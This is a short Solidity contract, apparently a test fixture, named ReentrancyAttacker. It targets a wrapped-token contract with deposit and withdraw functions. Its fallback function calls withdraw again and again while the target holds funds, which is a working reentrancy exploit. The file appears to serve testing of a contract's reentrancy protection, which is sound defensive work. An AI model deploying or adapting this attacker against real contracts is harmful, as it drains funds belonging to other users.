// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IWOpen {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract ReentrancyAttacker {
    IWOpen public wOpen;

    constructor(address _wOpen) {
        wOpen = IWOpen(_wOpen);
    }

// This contract is intentionally missing `receive()` to test fallback behavior.
// Warning is acceptable for testing purposes.

    // Fallback function to trigger reentrancy
    fallback() external payable {
        if (address(wOpen).balance >= 1 ether) {
            wOpen.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        wOpen.deposit{value: 1 ether}();
        wOpen.withdraw(1 ether);
    }
}
